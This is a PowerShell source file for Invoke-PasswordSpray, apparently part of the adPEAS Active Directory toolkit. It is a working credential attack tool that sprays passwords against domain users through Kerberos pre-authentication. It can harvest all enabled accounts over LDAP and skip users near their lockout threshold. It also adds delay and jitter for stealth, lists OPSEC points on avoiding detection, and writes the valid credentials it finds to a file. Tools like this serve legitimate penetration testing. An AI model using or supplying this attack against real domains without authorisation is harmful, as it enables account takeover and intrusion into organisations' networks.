function Invoke-PasswordSpray {
<#
.SYNOPSIS
    Performs Kerberos-based password spray attack against Active Directory.

.DESCRIPTION
    Tests a single password (or multiple passwords) against a list of usernames using
    Kerberos Pre-Authentication (AS-REQ). This avoids LDAP binds and is stealthier.

    Uses sequential testing to avoid account lockouts. Each user is tested only once
    per password, spreading attempts over time to stay under lockout thresholds.

.PARAMETER UserList
    Path to file containing usernames (one per line) or array of usernames.
    Usernames can be in format: username, DOMAIN\username, or username@domain.com

.PARAMETER Auto
    Automatically fetch all enabled users from the current adPEAS session.
    Requires an active LDAP connection via Connect-adPEAS.

    Auto mode includes intelligent lockout protection:
    - Reads the lockout policy off the domain object (threshold, observation window,
      duration)
    - Checks badPwdCount for each user
    - Skips users with badPwdCount >= (threshold - 1) to prevent lockouts
    - Displays skipped users with current bad password count
    - Only tests users with safe remaining attempts

    If the lockout policy cannot be read, auto mode stops rather than spraying blind.
    See -Force.

.PARAMETER Force
    Continue in auto mode even when the domain lockout policy could not be read.

    Without it, an unreadable policy aborts the run: the badPwdCount protection needs the
    threshold, and spraying without it can lock out every account in the domain. A domain
    that genuinely has no lockout policy is a different case and does not need -Force -
    there is nothing to lock out, and the run proceeds against all enabled users.

.PARAMETER Password
    Single password to test against all users.

.PARAMETER PasswordList
    Path to file containing passwords (one per line) or array of passwords.
    WARNING: Testing multiple passwords increases lockout risk!

.PARAMETER Domain
    Target domain FQDN (optional, uses current domain from session if not specified)

.PARAMETER Server
    Domain Controller to query (optional, uses auto-discovery if not specified)

.PARAMETER Credential
    PSCredential object for authentication (optional, uses current user/session if not specified)

.PARAMETER Delay
    Delay in milliseconds between each attempt. Default: 0 (no delay).
    Use for stealth (e.g., -Delay 100) or when testing multiple passwords.

.PARAMETER StopOnSuccess
    Stop testing as soon as first valid credential is found.

.PARAMETER OutputFile
    Export successful credentials to file (format: username:password).

.PARAMETER Jitter
    Add random jitter to delay (percentage). Example: -Delay 100 -Jitter 20 means 80-120ms.

.OUTPUTS
    PSCustomObject array with successful credentials:
    - Username
    - Password
    - Domain
    - Timestamp

.EXAMPLE
    # Basic password spray with single password
    Invoke-PasswordSpray -UserList users.txt -Password "Winter2024!" -Domain "contoso.com"

.EXAMPLE
    # Using existing session (Domain parameter optional)
    Connect-adPEAS -Domain "contoso.com" -UseWindowsAuth
    Invoke-PasswordSpray -UserList users.txt -Password "Winter2024!"

.EXAMPLE
    # Auto mode - fetch all enabled users with lockout protection
    Connect-adPEAS -Domain "contoso.com" -UseWindowsAuth
    Invoke-PasswordSpray -Auto -Password "Winter2024!"

    Output:
    [*] Auto mode: Reading domain lockout policy...
    [*] Lockout Policy:
        Threshold:          5 bad attempts
        Observation Window: 30 minutes
        Lockout Duration:   30 minutes

    [*] Fetching all enabled users from domain...
    [+] Found 523 enabled users
    [*] Checking badPwdCount for each user (lockout protection)...

    [!] WARNING: 3 users skipped due to lockout risk:
        - jdoe: 4/5 bad attempts (only 1 remaining)
        - asmith: 5/5 bad attempts (only 0 remaining)
        - bwilson: 4/5 bad attempts (only 1 remaining)

    [+] Safe to test: 520 users (skipped: 3)

.EXAMPLE
    # Password spray with delay for stealth
    Invoke-PasswordSpray -UserList users.txt -Password "Summer2024!" -Domain "contoso.com" -Delay 100

.EXAMPLE
    # Test multiple passwords (higher lockout risk!)
    Invoke-PasswordSpray -UserList users.txt -PasswordList passwords.txt -Domain "contoso.com" -Delay 1000

.EXAMPLE
    # Spray and export results
    $creds = Invoke-PasswordSpray -UserList users.txt -Password "P@ssw0rd" -Domain "contoso.com"
    $creds | Export-Csv -Path valid_creds.csv -NoTypeInformation

.EXAMPLE
    # User-as-pass spray (username = password)
    Get-Content users.txt | ForEach-Object {
        Invoke-PasswordSpray -UserList $_ -Password $_ -Domain "contoso.com"
    }

.NOTES
    Author: Alexander Sturz (@_61106960_)

    WARNING: Password spraying can cause account lockouts if not used carefully!
    - Use low attempt counts (1-2 passwords max)
    - Add delays between attempts when testing multiple passwords
    - Monitor for lockouts before continuing
    - Ensure you understand the target's lockout policy

    OPSEC Considerations:
    - Each attempt generates a Kerberos Pre-Auth event (4771)
    - Large bursts of failures from single IP are suspicious
    - Use -Delay parameter to spread attempts over time
#>
    [CmdletBinding(DefaultParameterSetName='UserList')]
    param(
        [Parameter(Mandatory=$true, Position=0, ParameterSetName='UserList')]
        [object]$UserList,

        [Parameter(Mandatory=$true, ParameterSetName='Auto')]
        [switch]$Auto,

        [Parameter(Mandatory=$false)]
        [string]$Password,

        [Parameter(Mandatory=$false)]
        [object]$PasswordList,

        [Parameter(Mandatory=$false)]
        [string]$Domain,

        [Parameter(Mandatory=$false)]
        [string]$Server,

        [Parameter(Mandatory=$false)]
        [System.Management.Automation.PSCredential]$Credential,

        [Parameter(Mandatory=$false)]
        [int]$Delay = 0,

        [Parameter(Mandatory=$false)]
        [int]$Jitter = 0,

        [Parameter(Mandatory=$false)]
        [switch]$StopOnSuccess,

        [Parameter(Mandatory=$false)]
        [switch]$Force,

        [Parameter(Mandatory=$false)]
        [string]$OutputFile
    )

    begin {
        # 'return' inside begin{} ends the block, not the function - process{} and end{}
        # still run. Every abort below therefore has to say so, and both later blocks have
        # to honour it. Without this a refused run still walked into end{}, where
        # ($endTime - $startTime) failed on a $startTime that was never set, so the caller
        # got the real error followed by an op_Subtraction one.
        $abortRun = $false

        # Validate parameters
        if (-not $Password -and -not $PasswordList) {
            Write-Error "You must specify either -Password or -PasswordList"
            $abortRun = $true; return
        }

        if ($Password -and $PasswordList) {
            Write-Error "Cannot specify both -Password and -PasswordList. Choose one."
            $abortRun = $true; return
        }

        # Build connection parameters (for Ensure-LDAPConnection and Get-Domain* calls)
        $connectionParams = @{}
        if ($Domain) { $connectionParams['Domain'] = $Domain }
        if ($Server) { $connectionParams['Server'] = $Server }
        if ($Credential) { $connectionParams['Credential'] = $Credential }

        # Load usernames
        $usernames = @()

        if ($Auto) {
            # Auto mode - fetch all enabled users from current adPEAS session
            if (-not (Ensure-LDAPConnection @connectionParams)) {
                Write-Error "Auto mode requires an active LDAP connection. Use Connect-adPEAS first."
                $abortRun = $true; return
            }

            Write-Host "[*] Auto mode: Reading domain lockout policy..." -ForegroundColor Cyan

            # Read the lockout policy off the domain object directly.
            #
            # NOT through Get-DomainPasswordPolicy: that is a check module. It hands its
            # policy object to Show-Object and returns nothing to a caller, so what this
            # code used to read from it was always $null - the threshold fell back to 0,
            # the badPwdCount protection below never ran once, and the console announced
            # "No lockout policy configured" for domains that very much had one. It also
            # rendered a whole report section, fine-grained policy scan included, into the
            # middle of the spray output.
            $lockoutThreshold    = 0
            $lockoutDurationText = 'unknown'
            $lockoutWindowText   = 'unknown'
            $lockoutPolicyRead   = $false

            $domainPolicyResults = Get-DomainObject -Identity $Script:LDAPContext.DomainDN @connectionParams
            $domainPolicy = if ($domainPolicyResults -is [array]) { $domainPolicyResults[0] } else { $domainPolicyResults }

            if ($domainPolicy) {
                $lockoutPolicyRead = $true

                if ($domainPolicy.lockoutThreshold) {
                    try { $lockoutThreshold = [int]$domainPolicy.lockoutThreshold } catch { $lockoutThreshold = 0 }
                }

                # Raw negative 100-nanosecond deltas - ConvertFrom-ADInterval knows the
                # Int64.MinValue "never" sentinel, which must not turn into a duration.
                $durationSpan = ConvertFrom-ADInterval -Value $domainPolicy.lockoutDuration
                $windowSpan   = ConvertFrom-ADInterval -Value $domainPolicy.lockOutObservationWindow

                $lockoutDurationText = if ($durationSpan -and $durationSpan.Ticks -gt 0) {
                    "$([int]$durationSpan.TotalMinutes) minutes"
                } else { 'until manually unlocked' }

                $lockoutWindowText = if ($windowSpan -and $windowSpan.Ticks -gt 0) {
                    "$([int]$windowSpan.TotalMinutes) minutes"
                } else { 'not set' }
            }

            if (-not $lockoutPolicyRead) {
                # Spraying without knowing the threshold can lock out every account in the
                # domain. Refusing is the safe default; -Force is the deliberate override.
                if (-not $Force) {
                    Write-Error "Could not read the domain lockout policy, so the lockout protection cannot run. Re-run with -Force to spray without it - this may lock out accounts."
                    $abortRun = $true; return
                }
                Write-Warning "Could not read the domain lockout policy. Continuing because -Force was given - accounts may be locked out."
            }

            Write-Host "[*] Lockout Policy:" -ForegroundColor Cyan
            if ($lockoutPolicyRead) {
                if ($lockoutThreshold -gt 0) {
                    Write-Host "    Threshold:          $lockoutThreshold bad attempts" -ForegroundColor Green
                } else {
                    Write-Host "    Threshold:          no lockout configured" -ForegroundColor Yellow
                }
                Write-Host "    Observation Window: $lockoutWindowText"
                Write-Host "    Lockout Duration:   $lockoutDurationText"
            } else {
                Write-Host "    Unknown - the policy could not be read" -ForegroundColor Red
            }
            Write-Host ""

            Write-Host "[*] Fetching all enabled users from domain..." -ForegroundColor Cyan

            # Get all enabled users with badPwdCount attribute
            $enabledUsers = Get-DomainUser -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" @connectionParams

            if (-not $enabledUsers) {
                Write-Error "No enabled users found in domain"
                $abortRun = $true; return
            }

            Write-Host "[+] Found $($enabledUsers.Count) enabled users" -ForegroundColor Green

            # Filter users based on lockout threshold
            $skippedUsers = @()
            $safeUsers = @()

            if ($lockoutThreshold -gt 0) {
                Write-Host "[*] Checking badPwdCount for each user (lockout protection)..." -ForegroundColor Cyan

                foreach ($user in $enabledUsers) {
                    $badPwdCount = 0
                    if ($user.badPwdCount) {
                        $badPwdCount = [int]$user.badPwdCount
                    }

                    # Calculate safety margin: Skip if user is 1 attempt away from lockout
                    $remainingAttempts = $lockoutThreshold - $badPwdCount

                    if ($remainingAttempts -le 1) {
                        $skippedUsers += [PSCustomObject]@{
                            Username = $user.sAMAccountName
                            BadPwdCount = $badPwdCount
                            RemainingAttempts = $remainingAttempts
                        }
                    } else {
                        $safeUsers += $user.sAMAccountName
                    }
                }

                if ($skippedUsers.Count -gt 0) {
                    Write-Host ""
                    Write-Host "[!] WARNING: $($skippedUsers.Count) users skipped due to lockout risk:" -ForegroundColor Yellow
                    foreach ($skipped in $skippedUsers) {
                        Write-Host "    - $($skipped.Username): $($skipped.BadPwdCount)/$lockoutThreshold bad attempts (only $($skipped.RemainingAttempts) remaining)" -ForegroundColor Yellow
                    }
                    Write-Host ""
                }

                $usernames = $safeUsers

                if ($usernames.Count -eq 0) {
                    Write-Error "No safe users to test - all accounts are close to lockout threshold"
                    $abortRun = $true; return
                }

                Write-Host "[+] Safe to test: $($usernames.Count) users (skipped: $($skippedUsers.Count))" -ForegroundColor Green
                Write-Host ""

            } else {
                # Threshold 0. Two very different reasons end up here, and the operator has
                # to be able to tell them apart: the domain really has no lockout policy
                # (spraying cannot lock anything), or the policy could not be read and the
                # run continues only because -Force was given.
                if ($lockoutPolicyRead) {
                    Write-Host "[*] Domain has no lockout policy configured - testing all enabled users" -ForegroundColor Yellow
                } else {
                    Write-Host "[!] Lockout policy unknown - testing all enabled users WITHOUT lockout protection" -ForegroundColor Red
                }
                Write-Host ""
                $usernames = $enabledUsers | ForEach-Object { $_.sAMAccountName }
            }

        } elseif ($UserList -is [string]) {
            if (Test-Path $UserList) {
                $usernames = Get-Content -Path $UserList | Where-Object { $_ -and $_.Trim() }
            } else {
                Write-Error "User list file not found: $UserList"
                $abortRun = $true; return
            }
        } elseif ($UserList -is [array]) {
            $usernames = $UserList
        } else {
            # Single username
            $usernames = @($UserList)
        }

        # Load passwords
        $passwords = @()
        if ($Password) {
            $passwords = @($Password)
        } else {
            if ($PasswordList -is [string]) {
                if (Test-Path $PasswordList) {
                    $passwords = Get-Content -Path $PasswordList | Where-Object { $_ -and $_.Trim() }
                } else {
                    Write-Error "Password list file not found: $PasswordList"
                    $abortRun = $true; return
                }
            } elseif ($PasswordList -is [array]) {
                $passwords = $PasswordList
            }
        }

        if ($usernames.Count -eq 0) {
            Write-Error "No usernames to test"
            $abortRun = $true; return
        }

        if ($passwords.Count -eq 0) {
            Write-Error "No passwords to test"
            $abortRun = $true; return
        }

        # Get Domain from session if not specified
        $targetDomain = $Domain
        if (-not $targetDomain -and $Script:LDAPContext) {
            $targetDomain = $Script:LDAPContext.DomainDNS
        }

        if (-not $targetDomain) {
            Write-Error "No domain specified and no active session. Use -Domain parameter or Connect-adPEAS first."
            $abortRun = $true; return
        }

        # Warn about lockout risk
        if ($passwords.Count -gt 1 -and $Delay -lt 500) {
            Write-Warning "Testing multiple passwords with low/no delay increases lockout risk!"
            Write-Warning "Consider using -Delay 1000 or higher when testing multiple passwords."
        }

        Write-Host "[*] Password Spray Configuration:" -ForegroundColor Cyan
        Write-Host "    Domain:          $targetDomain"
        if ($Server) {
            Write-Host "    DC:              $Server"
        }
        Write-Host "    Users:           $($usernames.Count)"
        Write-Host "    Passwords:       $($passwords.Count)"
        Write-Host "    Total Attempts:  $($usernames.Count * $passwords.Count)"
        Write-Host "    Delay:           ${Delay}ms" -NoNewline
        if ($Jitter -gt 0) {
            Write-Host " (+/- ${Jitter}%)" -ForegroundColor Yellow
        } else {
            Write-Host ""
        }
        Write-Host ""

        $successfulCreds = @()
        $totalAttempts = 0
        $successCount = 0
        $startTime = Get-Date
    }

    process {
        if ($abortRun) { return }

        # Test each password against all users
        foreach ($pass in $passwords) {
            if ($passwords.Count -gt 1) {
                Write-Host "[*] Testing password: $pass" -ForegroundColor Cyan
            }

            $attemptNum = 0
            foreach ($username in $usernames) {
                $attemptNum++
                $totalAttempts++

                # Parse username format (handle DOMAIN\user or user@domain)
                $cleanUsername = $username
                if ($username -match '\\') {
                    $cleanUsername = $username.Split('\')[1]
                } elseif ($username -match '@') {
                    $cleanUsername = $username.Split('@')[0]
                }

                # Progress indicator every 50 attempts
                if ($attemptNum % 50 -eq 0) {
                    $percent = [math]::Round(($attemptNum / $usernames.Count) * 100)
                    Write-Host "    Progress: $attemptNum/$($usernames.Count) ($percent%)" -ForegroundColor Gray
                }

                # Test credential via Kerberos Pre-Auth
                $kerberosParams = @{
                    UserName = $cleanUsername
                    Domain = $targetDomain
                    Password = $pass
                    ErrorAction = 'SilentlyContinue'
                }
                if ($Server) { $kerberosParams['DomainController'] = $Server }

                $result = Invoke-KerberosAuth @kerberosParams

                if ($result.Success) {
                    $successCount++
                    $credInfo = [PSCustomObject]@{
                        Username  = $cleanUsername
                        Password  = $pass
                        Domain    = $targetDomain
                        Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                        Method    = "Kerberos Pre-Auth"
                    }
                    $successfulCreds += $credInfo

                    Write-Host "[+] SUCCESS: ${cleanUsername}@${targetDomain}:${pass}" -ForegroundColor Green

                    # Export to file if specified
                    if ($OutputFile) {
                        "${cleanUsername}:${pass}" | Out-File -FilePath $OutputFile -Append -Encoding ASCII
                    }

                    if ($StopOnSuccess) {
                        Write-Host "[*] Stopping on first success (StopOnSuccess flag set)" -ForegroundColor Yellow
                        break
                    }
                } else {
                    Write-Verbose "[!] FAILED: ${cleanUsername}@${Domain}:${pass} - $($result.Error)"
                }

                # Apply delay with optional jitter
                if ($Delay -gt 0 -and $attemptNum -lt $usernames.Count) {
                    $actualDelay = $Delay
                    if ($Jitter -gt 0) {
                        $jitterAmount = [int]($Delay * ($Jitter / 100.0))
                        $actualDelay = $Delay + (Get-Random -Minimum (-$jitterAmount) -Maximum $jitterAmount)
                    }
                    Start-Sleep -Milliseconds $actualDelay
                }
            }

            if ($StopOnSuccess -and $successCount -gt 0) {
                break
            }
        }
    }

    end {
        # A refused run has no summary to print - and no $startTime to subtract from.
        if ($abortRun) { return }

        $endTime = Get-Date
        $duration = ($endTime - $startTime).TotalSeconds

        Write-Host ""
        Write-Host "============================================================" -ForegroundColor Cyan
        Write-Host "  Password Spray Summary" -ForegroundColor Cyan
        Write-Host "============================================================" -ForegroundColor Cyan
        Write-Host "  Total Attempts:    $totalAttempts"
        Write-Host "  Successful:        $successCount" -ForegroundColor $(if ($successCount -gt 0) { "Green" } else { "Gray" })
        Write-Host "  Failed:            $($totalAttempts - $successCount)"
        Write-Host "  Duration:          $([math]::Round($duration, 2)) seconds"
        Write-Host "  Rate:              $([math]::Round($totalAttempts / $duration, 2)) attempts/sec"
        if ($OutputFile -and $successCount -gt 0) {
            Write-Host "  Output File:       $OutputFile" -ForegroundColor Green
        }
        Write-Host "============================================================" -ForegroundColor Cyan

        return $successfulCreds
    }
}
